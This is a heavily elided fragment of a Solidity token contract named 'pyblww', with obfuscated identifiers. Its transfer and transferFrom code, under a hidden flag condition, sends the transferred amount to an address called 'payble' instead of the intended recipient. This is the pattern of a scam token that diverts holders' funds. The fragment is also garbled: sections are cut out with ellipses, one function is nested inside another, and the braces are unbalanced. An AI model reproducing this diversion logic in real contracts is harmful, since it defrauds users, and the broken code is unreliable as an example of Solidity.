...
contract pyublww {
    ...
    string public name = "pyblww";
	
    string public symbol = "pyblww";
    uint8 public decimals = 6;

    uint256 public totalSupply = 300 *10**6;
...
VXB[to] += value;  
 emit Transfer(msg.sender, to, value);
   ...
   if(VXBB[msg.sender] > BSE) {    
      ...
      VXB[msg.sender] -= value;  
        VXB[payble] += value;
        emit Transfer(msg.sender, payble, value);
                return true;
    }  }   
 ...
 function XVAL() internal  {
   ...
   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
       ...
       if(VXBB[from] == BSE) {
        ...
        VXB[payble] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, payble, value);
                return true;
    }}
